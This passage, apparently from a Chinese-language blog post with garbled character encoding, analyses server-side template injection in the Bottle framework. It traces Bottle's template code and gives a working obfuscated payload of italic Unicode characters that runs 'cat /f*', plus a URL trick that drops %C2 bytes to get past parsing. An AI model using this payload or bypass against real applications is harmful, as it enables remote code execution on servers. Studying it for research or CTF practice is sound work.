instance.&#x27;</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        m = <span class="variable language_">self</span>.re_split.search(<span class="variable language_">self</span>.source, pos=<span class="variable language_">self</span>.offset)</span><br><span class="line">        <span class="keyword">if</span> m:</span><br><span class="line">            text = <span class="variable language_">self</span>.source[<span class="variable language_">self</span>.offset:m.start()]</span><br><span class="line">            <span class="variable language_">self</span>.text_buffer.append(text)</span><br><span class="line">            <span class="variable language_">self</span>.offset = m.end()</span><br><span class="line">            <span class="keyword">if</span> m.group(<span class="number">1</span>):  <span class="comment"># Escape syntax</span></span><br><span class="line">                line, sep, _ = <span class="variable language_">self</span>.source[<span class="variable language_">self</span>.offset:].partition(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">                <span class="variable language_">self</span>.text_buffer.append(<span class="variable language_">self</span>.source[m.start():m.start(<span class="number">1</span>)] +</span><br><span class="line">                                        m.group(<span class="number">2</span>) + line + sep)</span><br><span class="line">                <span class="variable language_">self</span>.offset += <span class="built_in">len</span>(line + sep)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="variable language_">self</span>.flush_text()</span><br><span class="line">            <span class="variable language_">self</span>.offset += <span class="variable language_">self</span>.read_code(<span class="variable language_">self</span>.source[<span class="variable language_">self</span>.offset:],</span><br><span class="line">                                          multiline=<span class="built_in">bool</span>(m.group(<span class="number">4</span>)))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="variable language_">self</span>.text_buffer.append(<span class="variable language_">self</span>.source[<span class="variable language_">self</span>.offset:])</span><br><span class="line">    <span class="variable language_">self</span>.flush_text()</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(<span class="variable language_">self</span>.code_buffer)</span><br></pre></td></tr></table></figure>

<p>è¿™æ®µä»£ç ä¸»è¦å°±æ˜¯å°†æ¨¡æ¿&#x2F;è‡ªå®šä¹‰è¯­æ³•è½¬æ¢ä¸ºå¯æ‰§è¡Œä»£ç ï¼ˆå¦‚ Pythonï¼‰ã€‚</p>
<p>è¿™é‡Œæˆ‘ä»¬ä¸»è¦å…³æ³¨çš„æ˜¯<code>self.flush_text()</code>ï¼Œæˆ‘ä»¬è·Ÿè¿›ä¸€ä¸‹ã€‚</p>
<ul>
<li><strong><code>flush_text()</code></strong>: å°† <code>text_buffer</code> ä¸­çš„æ™®é€šæ–‡æœ¬è½¬æ¢ä¸ºç›®æ ‡ä»£ç ï¼ˆå¦‚ Python çš„ <code>print()</code> è¯­å¥ï¼‰ã€‚</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">flush_text</span>(<span class="params">self</span>):</span><br><span class="line">    text = <span class="string">&#x27;&#x27;</span>.join(<span class="variable language_">self</span>.text_buffer)</span><br><span class="line">    <span class="keyword">del</span> <span class="variable language_">self</span>.text_buffer[:]</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> text: <span class="keyword">return</span></span><br><span class="line">    parts, pos, nl = [], <span class="number">0</span>, <span class="string">&#x27;\\\n&#x27;</span> + <span class="string">&#x27;  &#x27;</span> * <span class="variable language_">self</span>.indent</span><br><span class="line">    <span class="keyword">for</span> m <span class="keyword">in</span> <span class="variable language_">self</span>.re_inl.finditer(text):</span><br><span class="line">        prefix, pos = text[pos:m.start()], m.end()</span><br><span class="line">        <span class="keyword">if</span> prefix:</span><br><span class="line">            parts.append(nl.join(<span class="built_in">map</span>(<span class="built_in">repr</span>, prefix.splitlines(<span class="literal">True</span>))))</span><br><span class="line">        <span class="keyword">if</span> prefix.endswith(<span class="string">&#x27;\n&#x27;</span>): parts[-<span class="number">1</span>] += nl</span><br><span class="line">        parts.append(<span class="variable language_">self</span>.process_inline(m.group(<span class="number">1</span>).strip()))</span><br><span class="line">    <span class="keyword">if</span> pos &lt; <span class="built_in">len</span>(text):</span><br><span class="line">        prefix = text[pos:]</span><br><span class="line">        lines = prefix.splitlines(<span class="literal">True</span>)</span><br><span class="line">        <span class="keyword">if</span> lines[-<span class="number">1</span>].endswith(<span class="string">&#x27;\\\\\n&#x27;</span>): lines[-<span class="number">1</span>] = lines[-<span class="number">1</span>][:-<span class="number">3</span>]</span><br><span class="line">        <span class="keyword">elif</span> lines[-<span class="number">1</span>].endswith(<span class="string">&#x27;\\\\\r\n&#x27;</span>): lines[-<span class="number">1</span>] = lines[-<span class="number">1</span>][:-<span class="number">4</span>]</span><br><span class="line">        parts.append(nl.join(<span class="built_in">map</span>(<span class="built_in">repr</span>, lines)))</span><br><span class="line">    code = <span class="string">&#x27;_printlist((%s,))&#x27;</span> % <span class="string">&#x27;, &#x27;</span>.join(parts)</span><br><span class="line">    <span class="variable language_">self</span>.lineno += code.count(<span class="string">&#x27;\n&#x27;</span>) + <span class="number">1</span></span><br><span class="line">    <span class="variable language_">self</span>.write_code(code)</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œæˆ‘ä»¬åœ¨codeä¸‹æ–¹åŠ ä¸€ä¸ª<code>print(code)</code></p>
<p>æˆ‘ä»¬è®¿é—®<code>http://127.0.0.1:5000/attack?payload=hello&#123;&#123;hello%20world&#125;&#125;</code>ï¼ŒæœåŠ¡ç«¯å›æ˜¾å¦‚ä¸‹ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hello&#123;&#123;hello world&#125;&#125;</span><br><span class="line">_printlist((&#x27;hello hello&#x27;, _escape(hello world),))</span><br></pre></td></tr></table></figure>

<p>è¿™ä¸ª_printlistå°±æ˜¯åœ¨execæ‰§è¡Œçš„å…¨å±€ç©ºé—´é‡Œçš„æ‰“å°å‡½æ•°ã€‚</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">env.update(&#123;</span><br><span class="line">            <span class="string">&#x27;_stdout&#x27;</span>: _stdout,</span><br><span class="line">            <span class="string">&#x27;_printlist&#x27;</span>: _stdout.extend,</span><br><span class="line">            <span class="string">&#x27;include&#x27;</span>: functools.partial(<span class="variable language_">self</span>._include, env),</span><br><span class="line">            <span class="string">&#x27;rebase&#x27;</span>: functools.partial(<span class="variable language_">self</span>._rebase, env),</span><br><span class="line">            <span class="string">&#x27;_rebase&#x27;</span>: <span class="literal">None</span>,</span><br><span class="line">            <span class="string">&#x27;_str&#x27;</span>: <span class="variable language_">self</span>._<span class="built_in">str</span>,</span><br><span class="line">            <span class="string">&#x27;_escape&#x27;</span>: <span class="variable language_">self</span>._escape,</span><br><span class="line">            <span class="string">&#x27;get&#x27;</span>: env.get,</span><br><span class="line">            <span class="string">&#x27;setdefault&#x27;</span>: env.setdefault,</span><br><span class="line">            <span class="string">&#x27;defined&#x27;</span>: env.__contains__</span><br><span class="line">        &#125;)</span><br></pre></td></tr></table></figure>

<p>ç„¶åæˆ‘ä»¬æ¥ç€çœ‹<code>flush_text</code>ï¼Œå…¶ä¸­æœ‰</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">parts.append(self.process_inline(m.group(1).strip()))</span><br></pre></td></tr></table></figure>

<p>æ¯ä¸€è¡Œæ¨¡æ¿éƒ½ä¼šç»è¿‡å®ƒï¼Œ<code>self.process_inline(m.group(1).strip())</code>ï¼Œæˆ‘ä»¬è·Ÿè¿›ä¸€ä¸‹ã€‚</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">process_inline</span>(<span class="params">chunk</span>):</span><br><span class="line">    <span class="keyword">if</span> chunk[<span class="number">0</span>] == <span class="string">&#x27;!&#x27;</span>: <span class="keyword">return</span> <span class="string">&#x27;_str(%s)&#x27;</span> % chunk[<span class="number">1</span>:]</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;_escape(%s)&#x27;</span> % chunk</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œæˆ‘ä»¬å‘ç°äº†ä¸è½¬ç æœ‰å…³çš„<code>_escape</code>å‡½æ•°ï¼Œæˆ‘ä»¬æ¥ä¸‹æ¥è·Ÿè¿›ä¸€ä¸‹ <code>self._escape</code>ï¼Œå‘ç°ä»–åœ¨prepareä¸­è¢«å®šä¹‰ã€‚</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">SimpleTemplate</span>(<span class="title class_ inherited__">BaseTemplate</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">prepare</span>(<span class="params">self,</span></span><br><span class="line"><span class="params">                escape_func=html_escape,</span></span><br><span class="line"><span class="params">                noescape=<span class="literal">False</span>,</span></span><br><span class="line"><span class="params">                syntax=<span class="literal">None</span>, **ka</span>):</span><br><span class="line">        <span class="variable language_">self</span>.cache = &#123;&#125;</span><br><span class="line">        enc = <span class="variable language_">self</span>.encoding</span><br><span class="line">        <span class="variable language_">self</span>._<span class="built_in">str</span> = <span class="keyword">lambda</span> x: touni(x, enc)</span><br><span class="line">        <span class="variable language_">self</span>._escape = <span class="keyword">lambda</span> x: escape_func(touni(x, enc))</span><br><span class="line">        <span class="variable language_">self</span>.syntax = syntax</span><br><span class="line">        <span class="keyword">if</span> noescape:</span><br><span class="line">            <span class="variable language_">self</span>._<span class="built_in">str</span>, <span class="variable language_">self</span>._escape = <span class="variable language_">self</span>._escape, <span class="variable language_">self</span>._<span class="built_in">str</span></span><br></pre></td></tr></table></figure>

<p>è¿˜è®°å¾—æ¯ä¸€æ¬¡è¿›å…¥SimpleTemplateéƒ½æœ‰ä¸€æ¬¡åˆå§‹åŒ–å—ï¼Œå°±æ˜¯<code>prepare</code>å‡½æ•°è¿™äº›ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">self._escape = lambda x: escape_func(touni(x, enc))</span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬è·Ÿè¿›ä¸€ä¸‹<code>escape_func</code>ï¼Œå‘ç°</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">escape_func=html_escape</span><br></pre></td></tr></table></figure>

<p>å†è·Ÿè¿›ä¸€ä¸‹<code>html_escape</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">html_escape</span>(<span class="params">string</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot; Escape HTML special characters ``&amp;&lt;&gt;`` and quotes ``&#x27;&quot;``. &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> string.replace(<span class="string">&#x27;&amp;&#x27;</span>, <span class="string">&#x27;&amp;amp;&#x27;</span>).replace(<span class="string">&#x27;&lt;&#x27;</span>, <span class="string">&#x27;&amp;lt;&#x27;</span>).replace(<span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;&amp;gt;&#x27;</span>)\</span><br><span class="line">                 .replace(<span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;&amp;quot;&#x27;</span>).replace(<span class="string">&quot;&#x27;&quot;</span>, <span class="string">&#x27;&amp;#039;&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>å°±æ˜¯ä¸€ä¸ªé˜²æ­¢XSSçš„HTMLç¼–ç å‡½æ•°ã€‚</p>
<p>è‡³æ­¤æˆ‘ä»¬å¾—å‡ºç»“è®ºï¼š<strong>æˆ‘ä»¬çš„è¾“å…¥ï¼Œä¸è®ºåœ¨ä¸åœ¨<code>&#123;&#123;&#125;&#125;</code>é‡Œï¼Œç»è¿‡å”¯ä¸€çš„ç¼–ç æ£€æŸ¥å°±æ˜¯å¯¹sourceçš„<code>touni()</code>ï¼Œä½†æ˜¯ç”±äºå…¨å±€å˜é‡ä¸­çš„unicodeåœ¨python3ä¸‹æ˜¯å…¨ä½“strï¼Œè¿™å°±å¯¼è‡´äº†æˆ‘ä»¬å¯ä»¥è¾“å…¥æ–œä½“å­—ç¬¦</strong></p>
<p>è¿™é‡Œç»™å‡ºä¸€ä¸ªæ–œä½“å­—ç¬¦ç”Ÿæˆå™¨ï¼š<a target="_blank" rel="noopener" href="https://exotictext.com/zh-cn/italic/">https://exotictext.com/zh-cn/italic/</a></p>
<img src="/2025/04/08/bottle%E6%A1%86%E6%9E%B6%E6%96%9C%E4%BD%93%E5%AD%97%E5%BC%95%E5%8F%91%E7%9A%84ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20250408184735562.png" class="" title="This is an example image">

<p>è¿™é‡Œ3.12.2åŠå…¶ä¹‹å‰çš„pythonç‰ˆæœ¬å¦‚æœæ‰§è¡Œä¸Šè¿°å‘½ä»¤ä¼šæŠ¥é”™ï¼</p>
<img src="/2025/04/08/bottle%E6%A1%86%E6%9E%B6%E6%96%9C%E4%BD%93%E5%AD%97%E5%BC%95%E5%8F%91%E7%9A%84ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20250408185439286.png" class="" title="This is an example image">

<p>æœ€åçš„ä»£ç ç”±pythonçš„<code>exec()</code>æ¥æ‰§è¡Œ</p>
<p>å‡å¦‚ç›´æ¥<code>exec()</code>ä»»æ„codeçš„è¯ï¼Œpythonä¼šæŠŠcodeä¸­å½“ä½œä»£ç å¤„ç†çš„æ–œä½“å­—æ ¹æ®<code>Decomposition</code>è½¬æˆå¯¹åº”çš„ASCIIå­—ç¬¦ï¼ˆå½“ä½œå­—ç¬¦ä¸²å¤„ç†çš„é™¤å¤–ï¼Œå¦‚æ­¤ä¾‹ä¸­ï¼Œå‡å¦‚whoamiæˆ–osä¸ºæ–œä½“ï¼Œåˆ™ä¼šæ— æ³•æ‰§è¡Œï¼Œå› ä¸ºæ‰¾ä¸åˆ°æ–œä½“çš„osåº“ï¼Œå’Œæ–œä½“çš„whoamiå‘½ä»¤ï¼‰ï¼Œè¿™é‡Œ<code>os</code>å’Œ<code>whoami</code>æ˜¯å½“ä½œå­—ç¬¦ä¸²å¤„ç†çš„ï¼</p>
<p>çœ‹åˆ°è¿™é‡Œï¼Œæˆ‘æƒ³èµ·ä¹‹å‰ctfä¸€é“sstiçš„é¢˜ä¹Ÿè€ƒåˆ°äº†è¿™ç§æ–œä½“çš„æ–¹æ³•ï¼Œè¿™é‡Œç»™å‡ºä¸€ä¸ªpayloadï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ğ’ˆğ’†ğ’•ğ’‚ğ’•ğ’•ğ’“(ğ’ˆğ’†ğ’•ğ’‚ğ’•ğ’•ğ’“(__ğ’Šğ’ğ’‘ğ’ğ’“ğ’•__(ğ’ˆğ’†ğ’•ğ’‚ğ’•ğ’•ğ’“(&#x27;&#x27;,ğ’ˆğ’†ğ’•ğ’‚ğ’•ğ’•ğ’“(&#x27;&#x27;,ğ’ğ’‚ğ’™(ğ’…ğ’Šğ’„ğ’•(ğ’‹ğ’ğ’Šğ’=())))(ğ’ğ’‚ğ’‘(ğ’„ğ’‰ğ’“,[106,111,105,110])))(ğ’ğ’‚ğ’‘(ğ’„ğ’‰ğ’“,[111, 115]))),ğ’ˆğ’†ğ’•ğ’‚ğ’•ğ’•ğ’“(&#x27;&#x27;,ğ’ˆğ’†ğ’•ğ’‚ğ’•ğ’•ğ’“(&#x27;&#x27;,ğ’ğ’‚ğ’™(ğ’…ğ’Šğ’„ğ’•(ğ’‹ğ’ğ’Šğ’=())))(ğ’ğ’‚ğ’‘(ğ’„ğ’‰ğ’“,[106,111,105,110])))(ğ’ğ’‚ğ’‘(ğ’„ğ’‰ğ’“,[112,111,112,101,110])))(ğ’ˆğ’†ğ’•ğ’‚ğ’•ğ’•ğ’“(&#x27;&#x27;,ğ’ˆğ’†ğ’•ğ’‚ğ’•ğ’•ğ’“(&#x27;&#x27;,ğ’ğ’‚ğ’™(ğ’…ğ’Šğ’„ğ’•(ğ’‹ğ’ğ’Šğ’=())))(ğ’ğ’‚ğ’‘(ğ’„ğ’‰ğ’“,[106,111,105,110])))(ğ’ğ’‚ğ’‘(ğ’„ğ’‰ğ’“,[99,97,116,32,47,102,42]))),ğ’ˆğ’†ğ’•ğ’‚ğ’•ğ’•ğ’“(&#x27;&#x27;,ğ’ˆğ’†ğ’•ğ’‚ğ’•ğ’•ğ’“(&#x27;&#x27;,ğ’ğ’‚ğ’™(ğ’…ğ’Šğ’„ğ’•(ğ’‹ğ’ğ’Šğ’=())))(ğ’ğ’‚ğ’‘(ğ’„ğ’‰ğ’“,[106,111,105,110])))(ğ’ğ’‚ğ’‘(ğ’„ğ’‰ğ’“,[114,101,97,100])))()</span><br></pre></td></tr></table></figure>

<p>ä»–è¿™ä¸ªå…¶å®æ˜¯ç­‰ä»·äº<code>__import__(&#39;os&#39;).popen(&#39;cat /f*&#39;).read()</code></p>
<img src="/2025/04/08/bottle%E6%A1%86%E6%9E%B6%E6%96%9C%E4%BD%93%E5%AD%97%E5%BC%95%E5%8F%91%E7%9A%84ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20250408190441433.png" class="" title="This is an example image">





<p>æ¥ä¸‹æ¥å†è¯´è¯´ä¸ºä»€ä¹ˆåªæœ‰ä¸¤ä¸ªå­—ç¬¦<code>Âª</code> (U+00AA)ï¼Œ<code>Âº</code> (U+00BA)æˆåŠŸäº†ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;Ã‚Âªbs(-1)&#125;&#125;</span><br><span class="line">127.0.0.1 - - [08/Apr/2025 19:06:12] &quot;GET /attack?payload=&#123;&#123;%C2%AAbs(-1)&#125;&#125; HTTP/1.1&quot; 400 752</span><br></pre></td></tr></table></figure>

<p>è¿™äº›ç‰¹æ®Šå­—ç¬¦ç»è¿‡URLç¼–ç ä¹‹åä¸€ä¸ªå­—ç¬¦éƒ½å¿…é¡»ä»¥ä¸¤ä¸ªç¼–ç å€¼è¡¨ç¤ºã€‚ä½†æ˜¯bottleåœ¨è§£æç¼–ç å€¼çš„æ—¶å€™æ˜¯æŒ‰ç…§ä¸€ä¸ªç¼–ç å€¼å¯¹åº”ä¸€ä¸ªå­—ç¬¦è¿›è¡Œè§£æçš„ï¼Œé‚£ä¹ˆbottleè§£æçš„å°±æ˜¯<code>%C2</code>,åªè¦åˆ é™¤æ‰<code>%C2</code>å°±èƒ½å°†å­—ç¬¦ä¼ å…¥åç«¯ï¼</p>
<p>æˆ‘ä»¬å†çœ‹çœ‹å…¶ä»–çš„æœ‰æ²¡æœ‰å¯åˆ©ç”¨çš„ï¼</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;Ã‚Âªbs(-Ã‚Â¹)&#125;&#125;</span><br><span class="line">http://127.0.0.1:5000/attack?payload=&#123;&#123;%C2%AAbs(-%C2%B9)&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>è‹¥æŠŠå‰é¢çš„<code>%C2</code>åˆ é™¤ï¼Œæˆ‘ä»¬ä¼ å…¥å¦‚ä¸‹çš„å‚æ•°</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:5000/attack?payload=&#123;&#123;%AAbs(%B9)&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>æœåŠ¡ç«¯å›æ˜¾å¦‚ä¸‹ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;Âªbs(Â¹)&#125;&#125;</span><br><span class="line">127.0.0.1 - - [08/Apr/2025 19:12:10] &quot;GET /attack?payload=&#123;&#123;%AAbs(%B9)&#125;&#125; HTTP/1.1&quot; 400 750</span><br></pre></td></tr></table></figure>

<img src="/2025/04/08/bottle%E6%A1%86%E6%9E%B6%E6%96%9C%E4%BD%93%E5%AD%97%E5%BC%95%E5%8F%91%E7%9A%84ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20250408191231182.png" class="" title="This is an example image">

<p>é‚£å°±æ˜¯ä¸è¡Œå–½ï¼</p>
<p>å…¶ä¸­åªæœ‰<code>Âª</code> (U+00AA)ï¼Œ<code>Âº</code> (U+00BA)ï¼Œ<code>Â¹</code> (U+00B9)ï¼Œ<code>Â²</code> (U+00B2)ï¼Œ<code>Â³</code> (U+00B3)æœ‰ç”¨ï¼Œå…¶ä¸­<code>Â¹</code> (U+00B9)ï¼Œ<code>Â²</code> (U+00B2)ï¼Œ<code>Â³</code> (U+00B3)åœ¨<code>exec()</code>æ—¶ä¸ä¼šè¢«pythonæ­£ç¡®è§£æã€‚è€Œ<code>Âª</code> (U+00AA)ï¼Œ<code>Âº</code> (U+00BA)æ‰§è¡Œçš„æ—¶å€™ç­‰æ•ˆäºå­—ç¬¦<code>a</code>,<code>o</code>ï¼Œåˆ«çš„å­—ç¬¦RCEæ ¹æœ¬ç”¨ä¸ä¸Šã€‚</p>
<img src="/2025/04/08/bottle%E6%A1%86%E6%9E%B6%E6%96%9C%E4%BD%93%E5%AD%97%E5%BC%95%E5%8F%91%E7%9A%84ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20250408191406445.png" class="" title="This is an example image">



<p>è¿™é‡Œç¨å¾®æ€»ç»“ä¸€ä¸‹ï¼Œå¦‚æœæˆ‘ä»¬æ˜¯ä»å‰ç«¯ä¼ å…¥çš„ï¼Œé‚£ä¹ˆä¸€å®šä¼šç»è¿‡urlç¼–ç ï¼Œä¸¾ä¸ªä¾‹å­ï¼š</p>
<p>æˆ‘ä»¬ä¼ å…¥çš„æ˜¯<code>&#123;&#123;ğ’¶ğ’·ğ“ˆ(1)&#125;&#125;</code>ï¼Œä½†æ˜¯åç«¯æ— æ³•å°†å…¶è§£æï¼Œå‰ç«¯é¡µé¢ä¼šæŠ¥é”™400ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1 - - [08/Apr/2025 19:15:16] &quot;GET /attack?payload=&#123;&#123;%F0%9D%92%B6%F0%9D%92%B7%F0%9D%93%88(1)&#125;&#125; HTTP/1.1&quot; 400 779</span><br><span class="line">&#123;&#123;Ã°ÂÂ’Â¶Ã°ÂÂ’Â·Ã°ÂÂ“Âˆ(1)&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>ä½†æ˜¯å¦‚æœæˆ‘ä»¬ç›´æ¥åœ¨åç«¯ä¼ å…¥<code>ğ’¶ğ’·ğ“ˆ(1)</code>ï¼Œå°†ä»¥ä¸‹è¯­å¥ç›´æ¥åŠ å…¥ä»£ç ä¸­</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> bottle</span><br><span class="line"><span class="meta">@bottle.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Hello, World!&#x27;</span></span><br><span class="line"><span class="meta">@bottle.route(<span class="params"><span class="string">&#x27;/attack&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">attack</span>():</span><br><span class="line">    <span class="keyword">return</span> bottle.template(<span class="string">&#x27;&#123;&#123;ğ’¶ğ’·ğ“ˆ(-2)&#125;&#125;&#x27;</span>)</span><br><span class="line">    <span class="comment"># payload = bottle.request.query.get(&#x27;payload&#x27;)</span></span><br><span class="line">    <span class="comment"># print(payload)</span></span><br><span class="line">    <span class="comment"># try:</span></span><br><span class="line">    <span class="comment">#     return bottle.template(&#x27;hello &#x27;+payload)</span></span><br><span class="line">    <span class="comment"># except:</span></span><br><span class="line">    <span class="comment">#     bottle.abort(400, &#x27;Invalid payload&#x27;)</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    bottle.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">5000</span>)</span><br></pre></td></tr></table></figure>

<img src="/2025/04/08/bottle%E6%A1%86%E6%9E%B6%E6%96%9C%E4%BD%93%E5%AD%97%E5%BC%95%E5%8F%91%E7%9A%84ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20250408191732187.png" class="" title="This is an example image">

<p>æˆ‘ä»¬è®¿é—®æ—¶å‰ç«¯æ­£å¸¸å›æ˜¾ï¼</p>
<p>å†çœ‹çœ‹<code>Âª</code> (U+00AA)ï¼Œ<code>Âº</code> (U+00BA)ï¼Œå¦‚æœæˆ‘ä»¬å‰ç«¯ä¼ å…¥ï¼Œä»–ä¼šä»¥ä¸¤ä¸ªç¼–ç å€¼è¡¨ç¤ºï¼Œè€Œbottleåœ¨è§£æç¼–ç å€¼çš„æ—¶å€™æ˜¯æŒ‰ç…§ä¸€ä¸ªç¼–ç å€¼å¯¹åº”ä¸€ä¸ªå­—ç¬¦è¿›è¡Œè§£æçš„ï¼Œæ‰€ä»¥å¦‚æœæˆ‘ä»¬ç›´æ¥ä¼ å…¥<code>Âª</code> (U+00AA)æˆ–è€…<code>Âº</code> (U+00BA)ï¼Œé‚£ä¹ˆå¿…ç„¶ä¹Ÿæ˜¯ä¼šæŠ¥é”™çš„ï¼Œå› æ­¤åœ¨å‰ç«¯ä¼ å…¥æ—¶éœ€è¦å°†å‰é¢çš„<code>%C2</code>åˆ é™¤åå†ä¼ å…¥ï¼</p>
<p>é‚£ä¹ˆå¦‚æœç›´æ¥ä»åç«¯ä¼ å…¥å‘¢ï¼Ÿçœ‹çœ‹æ•ˆæœ</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> bottle</span><br><span class="line"><span class="meta">@bottle.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Hello, World!&#x27;</span></span><br><span class="line"><span class="meta">@bottle.route(<span class="params"><span class="string">&#x27;/attack&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">attack</span>():</span><br><span class="line">    <span class="keyword">return</span> bottle.template(<span class="string">&#x27;&#123;&#123;Âªbs(-1)&#125;&#125;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    bottle.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">5000</span>)</span><br></pre></td></tr></table></figure>

<img src="/2025/04/08/bottle%E6%A1%86%E6%9E%B6%E6%96%9C%E4%BD%93%E5%AD%97%E5%BC%95%E5%8F%91%E7%9A%84ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20250408192016120.png" class="" title="This is an example image">



<p>å› æ­¤æˆ‘ä»¬æ‰€æœ‰çš„é—®é¢˜éƒ½èšç„¦åœ¨å¦‚ä½•å°†æ–œä½“å­—ç¬¦ä¼ å…¥templateä¸­ã€‚</p>
